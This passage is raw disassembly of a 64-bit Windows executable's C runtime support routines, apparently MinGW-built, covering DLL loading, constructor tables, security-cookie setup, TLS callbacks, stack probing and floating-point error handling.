  4055da:	5e                   	pop    %rsi
  4055db:	5f                   	pop    %rdi
  4055dc:	5d                   	pop    %rbp
  4055dd:	c3                   	ret
  4055de:	66 90                	xchg   %ax,%ax
  4055e0:	53                   	push   %rbx
  4055e1:	48 83 ec 20          	sub    $0x20,%rsp
  4055e5:	48 8b 05 a4 ae 15 00 	mov    0x15aea4(%rip),%rax        # 0x560490
  4055ec:	48 85 c0             	test   %rax,%rax
  4055ef:	74 0f                	je     0x405600
  4055f1:	48 83 c4 20          	add    $0x20,%rsp
  4055f5:	5b                   	pop    %rbx
  4055f6:	c3                   	ret
  4055f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4055fe:	00 00 
  405600:	31 c9                	xor    %ecx,%ecx
  405602:	8d 59 01             	lea    0x1(%rcx),%ebx
  405605:	e8 46 ff ff ff       	call   0x405550
  40560a:	48 85 c0             	test   %rax,%rax
  40560d:	74 71                	je     0x405680
  40560f:	0f b6 10             	movzbl (%rax),%edx
  405612:	83 e2 df             	and    $0xffffffdf,%edx
  405615:	80 fa 4d             	cmp    $0x4d,%dl
  405618:	75 46                	jne    0x405660
  40561a:	0f b6 50 01          	movzbl 0x1(%rax),%edx
  40561e:	83 e2 df             	and    $0xffffffdf,%edx
  405621:	80 fa 53             	cmp    $0x53,%dl
  405624:	75 3a                	jne    0x405660
  405626:	0f b6 50 02          	movzbl 0x2(%rax),%edx
  40562a:	83 e2 df             	and    $0xffffffdf,%edx
  40562d:	80 fa 56             	cmp    $0x56,%dl
  405630:	75 2e                	jne    0x405660
  405632:	0f b6 50 03          	movzbl 0x3(%rax),%edx
  405636:	83 e2 df             	and    $0xffffffdf,%edx
  405639:	80 fa 43             	cmp    $0x43,%dl
  40563c:	75 22                	jne    0x405660
  40563e:	0f b6 50 04          	movzbl 0x4(%rax),%edx
  405642:	83 e2 df             	and    $0xffffffdf,%edx
  405645:	80 fa 52             	cmp    $0x52,%dl
  405648:	75 16                	jne    0x405660
  40564a:	0f b6 50 05          	movzbl 0x5(%rax),%edx
  40564e:	89 d1                	mov    %edx,%ecx
  405650:	83 e1 df             	and    $0xffffffdf,%ecx
  405653:	80 f9 54             	cmp    $0x54,%cl
  405656:	74 0c                	je     0x405664
  405658:	83 ea 30             	sub    $0x30,%edx
  40565b:	80 fa 09             	cmp    $0x9,%dl
  40565e:	76 04                	jbe    0x405664
  405660:	89 d9                	mov    %ebx,%ecx
  405662:	eb 9e                	jmp    0x405602
  405664:	48 89 c1             	mov    %rax,%rcx
  405667:	ff 15 17 cf 15 00    	call   *0x15cf17(%rip)        # 0x562584
  40566d:	48 85 c0             	test   %rax,%rax
  405670:	48 89 05 19 ae 15 00 	mov    %rax,0x15ae19(%rip)        # 0x560490
  405677:	0f 85 74 ff ff ff    	jne    0x4055f1
  40567d:	0f 1f 00             	nopl   (%rax)
  405680:	48 8d 0d b9 81 15 00 	lea    0x1581b9(%rip),%rcx        # 0x55d840
  405687:	ff 15 4f cf 15 00    	call   *0x15cf4f(%rip)        # 0x5625dc
  40568d:	48 89 05 fc ad 15 00 	mov    %rax,0x15adfc(%rip)        # 0x560490
  405694:	e9 58 ff ff ff       	jmp    0x4055f1
  405699:	90                   	nop
  40569a:	90                   	nop
  40569b:	90                   	nop
  40569c:	90                   	nop
  40569d:	90                   	nop
  40569e:	90                   	nop
  40569f:	90                   	nop
  4056a0:	db e3                	fninit
  4056a2:	c3                   	ret
  4056a3:	90                   	nop
  4056a4:	90                   	nop
  4056a5:	90                   	nop
  4056a6:	90                   	nop
  4056a7:	90                   	nop
  4056a8:	90                   	nop
  4056a9:	90                   	nop
  4056aa:	90                   	nop
  4056ab:	90                   	nop
  4056ac:	90                   	nop
  4056ad:	90                   	nop
  4056ae:	90                   	nop
  4056af:	90                   	nop
  4056b0:	48 83 ec 28          	sub    $0x28,%rsp
  4056b4:	48 8b 05 b5 76 15 00 	mov    0x1576b5(%rip),%rax        # 0x55cd70
  4056bb:	48 8b 00             	mov    (%rax),%rax
  4056be:	48 85 c0             	test   %rax,%rax
  4056c1:	74 1d                	je     0x4056e0
  4056c3:	ff d0                	call   *%rax
  4056c5:	48 8b 05 a4 76 15 00 	mov    0x1576a4(%rip),%rax        # 0x55cd70
  4056cc:	48 8d 50 08          	lea    0x8(%rax),%rdx
  4056d0:	48 8b 40 08          	mov    0x8(%rax),%rax
  4056d4:	48 89 15 95 76 15 00 	mov    %rdx,0x157695(%rip)        # 0x55cd70
  4056db:	48 85 c0             	test   %rax,%rax
  4056de:	75 e3                	jne    0x4056c3
  4056e0:	48 83 c4 28          	add    $0x28,%rsp
  4056e4:	c3                   	ret
  4056e5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4056ec:	00 00 00 00 
  4056f0:	56                   	push   %rsi
  4056f1:	53                   	push   %rbx
  4056f2:	48 83 ec 28          	sub    $0x28,%rsp
  4056f6:	48 8b 05 f3 55 00 00 	mov    0x55f3(%rip),%rax        # 0x40acf0
  4056fd:	83 f8 ff             	cmp    $0xffffffff,%eax
  405700:	89 c3                	mov    %eax,%ebx
  405702:	74 2c                	je     0x405730
  405704:	85 db                	test   %ebx,%ebx
  405706:	48 8d 35 e3 55 00 00 	lea    0x55e3(%rip),%rsi        # 0x40acf0
  40570d:	74 0b                	je     0x40571a
  40570f:	90                   	nop
  405710:	89 d8                	mov    %ebx,%eax
  405712:	ff 14 c6             	call   *(%rsi,%rax,8)
  405715:	83 eb 01             	sub    $0x1,%ebx
  405718:	75 f6                	jne    0x405710
  40571a:	48 8d 0d 8f ff ff ff 	lea    -0x71(%rip),%rcx        # 0x4056b0
  405721:	48 83 c4 28          	add    $0x28,%rsp
  405725:	5b                   	pop    %rbx
  405726:	5e                   	pop    %rsi
  405727:	e9 34 f0 ff ff       	jmp    0x404760
  40572c:	0f 1f 40 00          	nopl   0x0(%rax)
  405730:	31 db                	xor    %ebx,%ebx
  405732:	48 8d 35 b7 55 00 00 	lea    0x55b7(%rip),%rsi        # 0x40acf0
  405739:	eb 07                	jmp    0x405742
  40573b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405740:	89 c3                	mov    %eax,%ebx
  405742:	8d 43 01             	lea    0x1(%rbx),%eax
  405745:	89 c2                	mov    %eax,%edx
  405747:	48 83 3c d6 00       	cmpq   $0x0,(%rsi,%rdx,8)
  40574c:	75 f2                	jne    0x405740
  40574e:	eb b4                	jmp    0x405704
  405750:	8b 05 4a ad 15 00    	mov    0x15ad4a(%rip),%eax        # 0x5604a0
  405756:	85 c0                	test   %eax,%eax
  405758:	74 06                	je     0x405760
  40575a:	f3 c3                	repz ret
  40575c:	0f 1f 40 00          	nopl   0x0(%rax)
  405760:	c7 05 36 ad 15 00 01 	movl   $0x1,0x15ad36(%rip)        # 0x5604a0
  405767:	00 00 00 
  40576a:	eb 84                	jmp    0x4056f0
  40576c:	90                   	nop
  40576d:	90                   	nop
  40576e:	90                   	nop
  40576f:	90                   	nop
  405770:	41 54                	push   %r12
  405772:	55                   	push   %rbp
  405773:	57                   	push   %rdi
  405774:	56                   	push   %rsi
  405775:	53                   	push   %rbx
  405776:	48 83 ec 40          	sub    $0x40,%rsp
  40577a:	48 8b 1d 7f 76 15 00 	mov    0x15767f(%rip),%rbx        # 0x55ce00
  405781:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  405788:	2b 00 00 
  40578b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  405792:	00 00 
  405794:	48 39 c3             	cmp    %rax,%rbx
  405797:	74 17                	je     0x4057b0
  405799:	48 f7 d3             	not    %rbx
  40579c:	48 89 1d 6d 76 15 00 	mov    %rbx,0x15766d(%rip)        # 0x55ce10
  4057a3:	48 83 c4 40          	add    $0x40,%rsp
  4057a7:	5b                   	pop    %rbx
  4057a8:	5e                   	pop    %rsi
  4057a9:	5f                   	pop    %rdi
  4057aa:	5d                   	pop    %rbp
  4057ab:	41 5c                	pop    %r12
  4057ad:	c3                   	ret
  4057ae:	66 90                	xchg   %ax,%ax
  4057b0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4057b5:	ff 15 e9 cd 15 00    	call   *0x15cde9(%rip)        # 0x5625a4
  4057bb:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
  4057c0:	ff 15 86 cd 15 00    	call   *0x15cd86(%rip)        # 0x56254c
  4057c6:	89 c5                	mov    %eax,%ebp
  4057c8:	ff 15 86 cd 15 00    	call   *0x15cd86(%rip)        # 0x562554
  4057ce:	89 c7                	mov    %eax,%edi
  4057d0:	ff 15 d6 cd 15 00    	call   *0x15cdd6(%rip)        # 0x5625ac
  4057d6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  4057db:	89 c6                	mov    %eax,%esi
  4057dd:	ff 15 11 ce 15 00    	call   *0x15ce11(%rip)        # 0x5625f4
  4057e3:	4c 89 e2             	mov    %r12,%rdx
  4057e6:	48 33 54 24 30       	xor    0x30(%rsp),%rdx
  4057eb:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
  4057f2:	ff 00 00 
  4057f5:	48 31 ea             	xor    %rbp,%rdx
  4057f8:	48 31 fa             	xor    %rdi,%rdx
  4057fb:	48 31 f2             	xor    %rsi,%rdx
  4057fe:	48 21 c2             	and    %rax,%rdx
  405801:	48 39 da             	cmp    %rbx,%rdx
  405804:	74 1f                	je     0x405825
  405806:	48 89 d0             	mov    %rdx,%rax
  405809:	48 f7 d0             	not    %rax
  40580c:	48 89 15 ed 75 15 00 	mov    %rdx,0x1575ed(%rip)        # 0x55ce00
  405813:	48 89 05 f6 75 15 00 	mov    %rax,0x1575f6(%rip)        # 0x55ce10
  40581a:	48 83 c4 40          	add    $0x40,%rsp
  40581e:	5b                   	pop    %rbx
  40581f:	5e                   	pop    %rsi
  405820:	5f                   	pop    %rdi
  405821:	5d                   	pop    %rbp
  405822:	41 5c                	pop    %r12
  405824:	c3                   	ret
  405825:	48 b8 cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rax
  40582c:	d4 ff ff 
  40582f:	48 ba 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rdx
  405836:	2b 00 00 
  405839:	eb d1                	jmp    0x40580c
  40583b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405840:	55                   	push   %rbp
  405841:	48 89 e5             	mov    %rsp,%rbp
  405844:	56                   	push   %rsi
  405845:	53                   	push   %rbx
  405846:	48 83 ec 70          	sub    $0x70,%rsp
  40584a:	48 89 ce             	mov    %rcx,%rsi
  40584d:	48 8d 0d 6c ac 15 00 	lea    0x15ac6c(%rip),%rcx        # 0x5604c0
  405854:	ff 15 ba cd 15 00    	call   *0x15cdba(%rip)        # 0x562614
  40585a:	48 8b 1d 57 ad 15 00 	mov    0x15ad57(%rip),%rbx        # 0x5605b8
  405861:	45 31 c0             	xor    %r8d,%r8d
  405864:	48 8d 55 c8          	lea    -0x38(%rbp),%rdx
  405868:	48 89 d9             	mov    %rbx,%rcx
  40586b:	ff 15 ab cd 15 00    	call   *0x15cdab(%rip)        # 0x56261c
  405871:	48 85 c0             	test   %rax,%rax
  405874:	49 89 c1             	mov    %rax,%r9
  405877:	0f 84 a3 00 00 00    	je     0x405920
  40587d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  405881:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  405888:	00 00 
  40588a:	49 89 d8             	mov    %rbx,%r8
  40588d:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  405891:	31 c9                	xor    %ecx,%ecx
  405893:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405898:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
  40589c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4058a1:	48 8d 05 18 ac 15 00 	lea    0x15ac18(%rip),%rax        # 0x5604c0
  4058a8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4058ad:	ff 15 71 cd 15 00    	call   *0x15cd71(%rip)        # 0x562624
  4058b3:	48 8b 05 fe ac 15 00 	mov    0x15acfe(%rip),%rax        # 0x5605b8
  4058ba:	31 c9                	xor    %ecx,%ecx
  4058bc:	48 89 35 7d ac 15 00 	mov    %rsi,0x15ac7d(%rip)        # 0x560540
  4058c3:	c7 05 d3 b0 15 00 09 	movl   $0xc0000409,0x15b0d3(%rip)        # 0x5609a0
  4058ca:	04 00 c0 
  4058cd:	c7 05 cd b0 15 00 01 	movl   $0x1,0x15b0cd(%rip)        # 0x5609a4
  4058d4:	00 00 00 
  4058d7:	48 89 05 d2 b0 15 00 	mov    %rax,0x15b0d2(%rip)        # 0x5609b0
  4058de:	48 8b 05 1b 75 15 00 	mov    0x15751b(%rip),%rax        # 0x55ce00
  4058e5:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4058e9:	48 8b 05 20 75 15 00 	mov    0x157520(%rip),%rax        # 0x55ce10
  4058f0:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4058f4:	ff 15 32 cd 15 00    	call   *0x15cd32(%rip)        # 0x56262c
  4058fa:	48 8d 0d 7f 74 15 00 	lea    0x15747f(%rip),%rcx        # 0x55cd80
  405901:	ff 15 45 cd 15 00    	call   *0x15cd45(%rip)        # 0x56264c
  405907:	ff 15 37 cc 15 00    	call   *0x15cc37(%rip)        # 0x562544
  40590d:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  405912:	48 89 c1             	mov    %rax,%rcx
  405915:	ff 15 21 cd 15 00    	call   *0x15cd21(%rip)        # 0x56263c
  40591b:	e8 88 50 00 00       	call   0x40a9a8
  405920:	48 8b 45 08          	mov    0x8(%rbp),%rax
  405924:	48 89 05 8d ac 15 00 	mov    %rax,0x15ac8d(%rip)        # 0x5605b8
  40592b:	48 8d 45 08          	lea    0x8(%rbp),%rax
  40592f:	48 89 05 22 ac 15 00 	mov    %rax,0x15ac22(%rip)        # 0x560558
  405936:	e9 78 ff ff ff       	jmp    0x4058b3
  40593b:	90                   	nop
  40593c:	90                   	nop
  40593d:	90                   	nop
  40593e:	90                   	nop
  40593f:	90                   	nop
  405940:	55                   	push   %rbp
  405941:	57                   	push   %rdi
  405942:	56                   	push   %rsi
  405943:	53                   	push   %rbx
  405944:	48 83 ec 28          	sub    $0x28,%rsp
  405948:	48 8d 0d 11 b1 15 00 	lea    0x15b111(%rip),%rcx        # 0x560a60
  40594f:	ff 15 e7 cb 15 00    	call   *0x15cbe7(%rip)        # 0x56253c
  405955:	48 8b 1d 2c b1 15 00 	mov    0x15b12c(%rip),%rbx        # 0x560a88
  40595c:	48 85 db             	test   %rbx,%rbx
  40595f:	74 33                	je     0x405994
  405961:	48 8b 2d dc cc 15 00 	mov    0x15ccdc(%rip),%rbp        # 0x562644
  405968:	48 8b 3d f5 cb 15 00 	mov    0x15cbf5(%rip),%rdi        # 0x562564
  40596f:	90                   	nop
  405970:	8b 0b                	mov    (%rbx),%ecx
  405972:	ff d5                	call   *%rbp
  405974:	48 89 c6             	mov    %rax,%rsi
  405977:	ff d7                	call   *%rdi
  405979:	85 c0                	test   %eax,%eax
  40597b:	75 0e                	jne    0x40598b
  40597d:	48 85 f6             	test   %rsi,%rsi
  405980:	74 09                	je     0x40598b
  405982:	48 8b 43 08          	mov    0x8(%rbx),%rax
  405986:	48 89 f1             	mov    %rsi,%rcx
  405989:	ff d0                	call   *%rax
  40598b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  40598f:	48 85 db             	test   %rbx,%rbx
  405992:	75 dc                	jne    0x405970
  405994:	48 8b 05 31 cc 15 00 	mov    0x15cc31(%rip),%rax        # 0x5625cc
  40599b:	48 8d 0d be b0 15 00 	lea    0x15b0be(%rip),%rcx        # 0x560a60
  4059a2:	48 83 c4 28          	add    $0x28,%rsp
  4059a6:	5b                   	pop    %rbx
  4059a7:	5e                   	pop    %rsi
  4059a8:	5f                   	pop    %rdi
  4059a9:	5d                   	pop    %rbp
  4059aa:	48 ff e0             	rex.W jmp *%rax
  4059ad:	0f 1f 00             	nopl   (%rax)
  4059b0:	55                   	push   %rbp
  4059b1:	57                   	push   %rdi
  4059b2:	56                   	push   %rsi
  4059b3:	53                   	push   %rbx
  4059b4:	48 83 ec 28          	sub    $0x28,%rsp
  4059b8:	8b 05 82 b0 15 00    	mov    0x15b082(%rip),%eax        # 0x560a40
  4059be:	31 f6                	xor    %esi,%esi
  4059c0:	89 cd                	mov    %ecx,%ebp
  4059c2:	48 89 d7             	mov    %rdx,%rdi
  4059c5:	85 c0                	test   %eax,%eax
  4059c7:	75 0b                	jne    0x4059d4
  4059c9:	89 f0                	mov    %esi,%eax
  4059cb:	48 83 c4 28          	add    $0x28,%rsp
  4059cf:	5b                   	pop    %rbx
  4059d0:	5e                   	pop    %rsi
  4059d1:	5f                   	pop    %rdi
  4059d2:	5d                   	pop    %rbp
  4059d3:	c3                   	ret
  4059d4:	ba 18 00 00 00       	mov    $0x18,%edx
  4059d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4059de:	e8 d5 4f 00 00       	call   0x40a9b8
  4059e3:	48 85 c0             	test   %rax,%rax
  4059e6:	48 89 c3             	mov    %rax,%rbx
  4059e9:	74 3d                	je     0x405a28
  4059eb:	89 28                	mov    %ebp,(%rax)
  4059ed:	48 89 78 08          	mov    %rdi,0x8(%rax)
  4059f1:	48 8d 0d 68 b0 15 00 	lea    0x15b068(%rip),%rcx        # 0x560a60
  4059f8:	ff 15 3e cb 15 00    	call   *0x15cb3e(%rip)        # 0x56253c
  4059fe:	48 8b 05 83 b0 15 00 	mov    0x15b083(%rip),%rax        # 0x560a88
  405a05:	48 8d 0d 54 b0 15 00 	lea    0x15b054(%rip),%rcx        # 0x560a60
  405a0c:	48 89 1d 75 b0 15 00 	mov    %rbx,0x15b075(%rip)        # 0x560a88
  405a13:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405a17:	ff 15 af cb 15 00    	call   *0x15cbaf(%rip)        # 0x5625cc
  405a1d:	89 f0                	mov    %esi,%eax
  405a1f:	48 83 c4 28          	add    $0x28,%rsp
  405a23:	5b                   	pop    %rbx
  405a24:	5e                   	pop    %rsi
  405a25:	5f                   	pop    %rdi
  405a26:	5d                   	pop    %rbp
  405a27:	c3                   	ret
  405a28:	be ff ff ff ff       	mov    $0xffffffff,%esi
  405a2d:	eb 9a                	jmp    0x4059c9
  405a2f:	90                   	nop
  405a30:	53                   	push   %rbx
  405a31:	48 83 ec 20          	sub    $0x20,%rsp
  405a35:	8b 05 05 b0 15 00    	mov    0x15b005(%rip),%eax        # 0x560a40
  405a3b:	89 cb                	mov    %ecx,%ebx
  405a3d:	85 c0                	test   %eax,%eax
  405a3f:	75 0f                	jne    0x405a50
  405a41:	31 c0                	xor    %eax,%eax
  405a43:	48 83 c4 20          	add    $0x20,%rsp
  405a47:	5b                   	pop    %rbx
  405a48:	c3                   	ret
  405a49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405a50:	48 8d 0d 09 b0 15 00 	lea    0x15b009(%rip),%rcx        # 0x560a60
  405a57:	ff 15 df ca 15 00    	call   *0x15cadf(%rip)        # 0x56253c
  405a5d:	48 8b 15 24 b0 15 00 	mov    0x15b024(%rip),%rdx        # 0x560a88
  405a64:	48 85 d2             	test   %rdx,%rdx
  405a67:	74 1c                	je     0x405a85
  405a69:	8b 02                	mov    (%rdx),%eax
  405a6b:	39 d8                	cmp    %ebx,%eax
  405a6d:	75 0d                	jne    0x405a7c
  405a6f:	eb 4e                	jmp    0x405abf
  405a71:	44 8b 00             	mov    (%rax),%r8d
  405a74:	41 39 d8             	cmp    %ebx,%r8d
  405a77:	74 27                	je     0x405aa0
  405a79:	48 89 c2             	mov    %rax,%rdx
  405a7c:	48 8b 42 10          	mov    0x10(%rdx),%rax
  405a80:	48 85 c0             	test   %rax,%rax
  405a83:	75 ec                	jne    0x405a71
  405a85:	48 8d 0d d4 af 15 00 	lea    0x15afd4(%rip),%rcx        # 0x560a60
  405a8c:	ff 15 3a cb 15 00    	call   *0x15cb3a(%rip)        # 0x5625cc
  405a92:	31 c0                	xor    %eax,%eax
  405a94:	48 83 c4 20          	add    $0x20,%rsp
  405a98:	5b                   	pop    %rbx
  405a99:	c3                   	ret
  405a9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405aa0:	48 8b 48 10          	mov    0x10(%rax),%rcx
  405aa4:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  405aa8:	48 89 c1             	mov    %rax,%rcx
  405aab:	e8 80 4e 00 00       	call   0x40a930
  405ab0:	48 8d 0d a9 af 15 00 	lea    0x15afa9(%rip),%rcx        # 0x560a60
  405ab7:	ff 15 0f cb 15 00    	call   *0x15cb0f(%rip)        # 0x5625cc
  405abd:	eb d3                	jmp    0x405a92
  405abf:	48 8b 42 10          	mov    0x10(%rdx),%rax
  405ac3:	48 89 05 be af 15 00 	mov    %rax,0x15afbe(%rip)        # 0x560a88
  405aca:	48 89 d0             	mov    %rdx,%rax
  405acd:	eb d9                	jmp    0x405aa8
  405acf:	90                   	nop
  405ad0:	48 83 ec 28          	sub    $0x28,%rsp
  405ad4:	83 fa 01             	cmp    $0x1,%edx
  405ad7:	74 47                	je     0x405b20
  405ad9:	72 15                	jb     0x405af0
  405adb:	83 fa 03             	cmp    $0x3,%edx
  405ade:	74 60                	je     0x405b40
  405ae0:	b8 01 00 00 00       	mov    $0x1,%eax
  405ae5:	48 83 c4 28          	add    $0x28,%rsp
  405ae9:	c3                   	ret
  405aea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405af0:	8b 05 4a af 15 00    	mov    0x15af4a(%rip),%eax        # 0x560a40
  405af6:	85 c0                	test   %eax,%eax
  405af8:	75 66                	jne    0x405b60
  405afa:	8b 05 40 af 15 00    	mov    0x15af40(%rip),%eax        # 0x560a40
  405b00:	83 f8 01             	cmp    $0x1,%eax
  405b03:	75 db                	jne    0x405ae0
  405b05:	48 8d 0d 54 af 15 00 	lea    0x15af54(%rip),%rcx        # 0x560a60
  405b0c:	c7 05 2a af 15 00 00 	movl   $0x0,0x15af2a(%rip)        # 0x560a40
  405b13:	00 00 00 
  405b16:	ff 15 18 ca 15 00    	call   *0x15ca18(%rip)        # 0x562534
  405b1c:	eb c2                	jmp    0x405ae0
  405b1e:	66 90                	xchg   %ax,%ax
  405b20:	8b 05 1a af 15 00    	mov    0x15af1a(%rip),%eax        # 0x560a40
  405b26:	85 c0                	test   %eax,%eax
  405b28:	74 27                	je     0x405b51
  405b2a:	b8 01 00 00 00       	mov    $0x1,%eax
  405b2f:	c7 05 07 af 15 00 01 	movl   $0x1,0x15af07(%rip)        # 0x560a40
  405b36:	00 00 00 
  405b39:	48 83 c4 28          	add    $0x28,%rsp
  405b3d:	c3                   	ret
  405b3e:	66 90                	xchg   %ax,%ax
  405b40:	8b 05 fa ae 15 00    	mov    0x15aefa(%rip),%eax        # 0x560a40
  405b46:	85 c0                	test   %eax,%eax
  405b48:	74 96                	je     0x405ae0
  405b4a:	e8 f1 fd ff ff       	call   0x405940
  405b4f:	eb 8f                	jmp    0x405ae0
  405b51:	48 8d 0d 08 af 15 00 	lea    0x15af08(%rip),%rcx        # 0x560a60
  405b58:	ff 15 5e ca 15 00    	call   *0x15ca5e(%rip)        # 0x5625bc
  405b5e:	eb ca                	jmp    0x405b2a
  405b60:	e8 db fd ff ff       	call   0x405940
  405b65:	eb 93                	jmp    0x405afa
  405b67:	90                   	nop
  405b68:	90                   	nop
  405b69:	90                   	nop
  405b6a:	90                   	nop
  405b6b:	90                   	nop
  405b6c:	90                   	nop
  405b6d:	90                   	nop
  405b6e:	90                   	nop
  405b6f:	90                   	nop
  405b70:	51                   	push   %rcx
  405b71:	50                   	push   %rax
  405b72:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  405b78:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  405b7d:	72 19                	jb     0x405b98
  405b7f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  405b86:	48 83 09 00          	orq    $0x0,(%rcx)
  405b8a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  405b90:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  405b96:	77 e7                	ja     0x405b7f
  405b98:	48 29 c1             	sub    %rax,%rcx
  405b9b:	48 83 09 00          	orq    $0x0,(%rcx)
  405b9f:	58                   	pop    %rax
  405ba0:	59                   	pop    %rcx
  405ba1:	c3                   	ret
  405ba2:	90                   	nop
  405ba3:	90                   	nop
  405ba4:	90                   	nop
  405ba5:	90                   	nop
  405ba6:	90                   	nop
  405ba7:	90                   	nop
  405ba8:	90                   	nop
  405ba9:	90                   	nop
  405baa:	90                   	nop
  405bab:	90                   	nop
  405bac:	90                   	nop
  405bad:	90                   	nop
  405bae:	90                   	nop
  405baf:	90                   	nop
  405bb0:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  405bb7:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  405bbd:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  405bc2:	dd 44 24 38          	fldl   0x38(%rsp)
  405bc6:	48 89 ca             	mov    %rcx,%rdx
  405bc9:	48 c1 ea 20          	shr    $0x20,%rdx
  405bcd:	89 d0                	mov    %edx,%eax
  405bcf:	81 e2 00 00 f0 7f    	and    $0x7ff00000,%edx
  405bd5:	25 ff ff 0f 00       	and    $0xfffff,%eax
  405bda:	09 c8                	or     %ecx,%eax
  405bdc:	89 c1                	mov    %eax,%ecx
  405bde:	09 d1                	or     %edx,%ecx
  405be0:	74 04                	je     0x405be6
  405be2:	85 d2                	test   %edx,%edx
  405be4:	75 3a                	jne    0x405c20
  405be6:	db 7c 24 60          	fstpt  0x60(%rsp)
  405bea:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
  405bef:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  405bf4:	e8 47 02 00 00       	call   0x405e40
  405bf9:	db 6c 24 70          	fldt   0x70(%rsp)
  405bfd:	dd 5c 24 58          	fstpl  0x58(%rsp)
  405c01:	dd 44 24 58          	fldl   0x58(%rsp)
  405c05:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405c09:	f2 0f 10 44 24 38    	movsd  0x38(%rsp),%xmm0
  405c0f:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  405c16:	c3                   	ret
  405c17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  405c1e:	00 00 
  405c20:	81 fa 00 00 f0 7f    	cmp    $0x7ff00000,%edx
  405c26:	75 be                	jne    0x405be6
  405c28:	85 c0                	test   %eax,%eax
  405c2a:	dd 5c 24 40          	fstpl  0x40(%rsp)
  405c2e:	74 40                	je     0x405c70
  405c30:	e8 8b 4d 00 00       	call   0x40a9c0
  405c35:	dd 44 24 40          	fldl   0x40(%rsp)
  405c39:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  405c3f:	48 8d 15 1a 7c 15 00 	lea    0x157c1a(%rip),%rdx        # 0x55d860
  405c46:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  405c4a:	b9 01 00 00 00       	mov    $0x1,%ecx
  405c4f:	dd 54 24 20          	fstl   0x20(%rsp)
  405c53:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405c57:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405c5d:	e8 9e ef ff ff       	call   0x404c00
  405c62:	dd 44 24 40          	fldl   0x40(%rsp)
  405c66:	eb 9d                	jmp    0x405c05
  405c68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  405c6f:	00 
  405c70:	e8 4b 4d 00 00       	call   0x40a9c0
  405c75:	dd 44 24 40          	fldl   0x40(%rsp)
  405c79:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  405c7f:	48 8d 15 da 7b 15 00 	lea    0x157bda(%rip),%rdx        # 0x55d860
  405c86:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  405c8a:	48 b8 00 00 00 00 00 	movabs $0x7ff8000000000000,%rax
  405c91:	00 f8 7f 
  405c94:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405c98:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  405c9d:	b9 01 00 00 00       	mov    $0x1,%ecx
  405ca2:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405ca8:	e8 53 ef ff ff       	call   0x404c00
  405cad:	dd 05 b5 7b 15 00    	fldl   0x157bb5(%rip)        # 0x55d868
  405cb3:	e9 4d ff ff ff       	jmp    0x405c05
  405cb8:	90                   	nop
  405cb9:	90                   	nop
  405cba:	90                   	nop
  405cbb:	90                   	nop
  405cbc:	90                   	nop
  405cbd:	90                   	nop
  405cbe:	90                   	nop
  405cbf:	90                   	nop
  405cc0:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  405cc7:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  405ccd:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  405cd2:	dd 44 24 38          	fldl   0x38(%rsp)
  405cd6:	48 89 ca             	mov    %rcx,%rdx
  405cd9:	48 c1 ea 20          	shr    $0x20,%rdx
  405cdd:	89 d0                	mov    %edx,%eax
  405cdf:	81 e2 00 00 f0 7f    	and    $0x7ff00000,%edx
  405ce5:	25 ff ff 0f 00       	and    $0xfffff,%eax
  405cea:	09 c8                	or     %ecx,%eax
  405cec:	89 c1                	mov    %eax,%ecx
  405cee:	09 d1                	or     %edx,%ecx
  405cf0:	74 04                	je     0x405cf6
  405cf2:	85 d2                	test   %edx,%edx
